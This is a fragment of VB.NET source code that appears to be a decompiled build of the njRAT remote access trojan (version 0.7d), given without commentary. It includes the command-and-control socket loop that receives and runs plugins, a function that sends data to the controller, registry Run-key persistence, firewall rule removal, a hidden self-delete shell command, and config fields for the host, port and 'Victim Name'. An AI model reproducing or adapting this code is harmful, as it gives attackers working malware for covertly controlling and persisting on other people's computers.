                    OK.b = New Byte((OK.C.Available + 1) - 1) {}
                    Dim num5 As Long = (num - OK.MeM.Length)
                    If (OK.b.Length > num5) Then
                        OK.b = New Byte((CInt((num5 - 1)) + 1) - 1) {}
                    End If
                    Dim count As Integer = OK.C.Client.Receive(OK.b, 0, OK.b.Length, SocketFlags.None)
                    OK.MeM.Write(OK.b, 0, count)
                    If (OK.MeM.Length = num) Then
                        num = -1
                        Dim thread As New Thread(New ParameterizedThreadStart(AddressOf OK._Lambda__1), 1)
                        thread.Start(OK.MeM.ToArray)
                        thread.Join(100)
                        OK.MeM.Dispose()
                        OK.MeM = New MemoryStream
                    End If
                    GoTo Label_001B
                End If
            Catch exception1 As Exception
                ProjectData.SetProjectError(exception1)
                Dim exception As Exception = exception1
                ProjectData.ClearProjectError()
            End Try
        End If
Label_01C1:
        Try
            If (Not OK.PLG Is Nothing) Then
                NewLateBinding.LateCall(OK.PLG, Nothing, "clear", New Object(0 - 1) {}, Nothing, Nothing, Nothing, True)
                OK.PLG = Nothing
            End If
        Catch exception3 As Exception
            ProjectData.SetProjectError(exception3)
            Dim exception2 As Exception = exception3
            ProjectData.ClearProjectError()
        End Try
        OK.Cn = False
        If Not OK.connect Then
            GoTo Label_01C1
        End If
        OK.Cn = True
        GoTo Label_0000
    End Sub

    Public Shared Function SB(ByRef S As String) As Byte()
        Return Encoding.UTF8.GetBytes(S)
    End Function

    Public Shared Function Send(ByVal S As String) As Boolean
        Return OK.Sendb(OK.SB(S))
    End Function

    Public Shared Function Sendb(ByVal b As Byte()) As Boolean
        If Not OK.Cn Then
            Return False
        End If
        Try
            Dim lO As FileInfo = OK.LO
            SyncLock lO
                If Not OK.Cn Then
                    Return False
                End If
                Dim stream As New MemoryStream
                Dim length As Integer = b.Length
                Dim buffer As Byte() = OK.SB((length.ToString & ChrW(0)))
                stream.Write(buffer, 0, buffer.Length)
                stream.Write(b, 0, b.Length)
                OK.C.Client.Send(stream.ToArray, 0, CInt(stream.Length), SocketFlags.None)
            End SyncLock
        Catch exception1 As Exception
            ProjectData.SetProjectError(exception1)
            Dim exception As Exception = exception1
            Try
                If OK.Cn Then
                    OK.Cn = False
                    OK.C.Close()
                End If
            Catch exception3 As Exception
                ProjectData.SetProjectError(exception3)
                Dim exception2 As Exception = exception3
                ProjectData.ClearProjectError()
            End Try
            ProjectData.ClearProjectError()
        End Try
        Return OK.Cn
    End Function

    Public Shared Function STV(ByVal n As String, ByVal t As Object, ByVal typ As RegistryValueKind) As Boolean
        Dim flag As Boolean
        Try
            OK.F.Registry.CurrentUser.CreateSubKey(("Software\" & OK.RG)).SetValue(n, RuntimeHelpers.GetObjectValue(t), typ)
            flag = True
        Catch exception1 As Exception
            ProjectData.SetProjectError(exception1)
            Dim exception As Exception = exception1
            flag = False
            ProjectData.ClearProjectError()
        End Try
        Return flag
    End Function

    Public Shared Sub UNS()
        OK.pr(0)
        OK.Isu = False
        Try
            OK.F.Registry.CurrentUser.OpenSubKey(OK.sf, True).DeleteValue(OK.RG, False)
        Catch exception1 As Exception
            ProjectData.SetProjectError(exception1)
            Dim exception As Exception = exception1
            ProjectData.ClearProjectError()
        End Try
        Try
            OK.F.Registry.LocalMachine.OpenSubKey(OK.sf, True).DeleteValue(OK.RG, False)
        Catch exception7 As Exception
            ProjectData.SetProjectError(exception7)
            Dim exception2 As Exception = exception7
            ProjectData.ClearProjectError()
        End Try
        Try
            Interaction.Shell(("netsh firewall delete allowedprogram """ & OK.LO.FullName & """"), AppWinStyle.Hide, False, -1)
        Catch exception8 As Exception
            ProjectData.SetProjectError(exception8)
            Dim exception3 As Exception = exception8
            ProjectData.ClearProjectError()
        End Try
        Try
            If (Not OK.FS Is Nothing) Then
                OK.FS.Dispose()
                File.Delete((Environment.GetFolderPath(SpecialFolder.Startup) & "\" & OK.RG & ".exe"))
            End If
        Catch exception9 As Exception
            ProjectData.SetProjectError(exception9)
            Dim exception4 As Exception = exception9
            ProjectData.ClearProjectError()
        End Try
        Try
            OK.F.Registry.CurrentUser.OpenSubKey("Software", True).DeleteSubKey(OK.RG, False)
        Catch exception10 As Exception
            ProjectData.SetProjectError(exception10)
            Dim exception5 As Exception = exception10
            ProjectData.ClearProjectError()
        End Try
        Try
            Interaction.Shell(("cmd.exe /c ping 0 -n 2 & del """ & OK.LO.FullName & """"), AppWinStyle.Hide, False, -1)
        Catch exception11 As Exception
            ProjectData.SetProjectError(exception11)
            Dim exception6 As Exception = exception11
            ProjectData.ClearProjectError()
        End Try
        ProjectData.EndApp()
    End Sub

    Public Shared Function ZIP(ByVal B As Byte()) As Byte()
        Dim stream2 As New MemoryStream(B)
        Dim stream As New GZipStream(stream2, CompressionMode.Decompress)
        Dim buffer2 As Byte() = New Byte(4 - 1) {}
        stream2.Position = (stream2.Length - 5)
        stream2.Read(buffer2, 0, 4)
        Dim count As Integer = BitConverter.ToInt32(buffer2, 0)
        stream2.Position = 0
        Dim array As Byte() = New Byte(((count - 1) + 1) - 1) {}
        stream.Read(array, 0, count)
        stream.Dispose()
        stream2.Dispose()
        Return array
    End Function


    Public Shared message_statu As String = "False" 'ON/OFF MsgBox
    Public Shared message_title As String = "" 'msgbox title
    Public Shared message_ms As String = "" 'MsgBox message


    Private Shared b As Byte() = New Byte(&H1401 - 1) {}
    Public Shared BD As Boolean = Conversions.ToBoolean("False") 'Protect Process
    Public Shared C As TcpClient = Nothing
    Public Shared Cn As Boolean = False
    Public Shared DR As String = "TEMP" 'Directory
    Public Shared EXE As String = "server.exe" 'Process Name
    Public Shared F As Computer = New Computer
    Public Shared FS As FileStream
    Public Shared H As String = "127.0.0.1" 'Host
    Public Shared Idr As Boolean = Conversions.ToBoolean("False") 'Copy
    Public Shared IsF As Boolean = Conversions.ToBoolean("False") 'Copy StartUp
    Public Shared Isu As Boolean = Conversions.ToBoolean("True") 'Registry StartUp
    Public Shared kq As kl = Nothing
    Private Shared lastcap As String = ""
    Public Shared LO As FileInfo = New FileInfo(Assembly.GetEntryAssembly.Location)
    Private Shared MeM As MemoryStream = New MemoryStream
    Public Shared MT As Object = Nothing
    Public Shared P As String = "50" 'Port
    Public Shared PLG As Object = Nothing
    Public Shared RG As String = "e99e462d99ad204bdf7d672852a4e30a" 'Registry Key Name
    Public Shared sf As String = "Software\Microsoft\Windows\CurrentVersion\Run" 'Registry Key
    Public Shared VN As String = "SGFjS2Vk" 'Victim Name (Encrypted)
    Public Shared VR As String = "0.7d" 'Version
    Public Shared Y As String = "|'|'|" 'Connexion Password (Split)

End Class

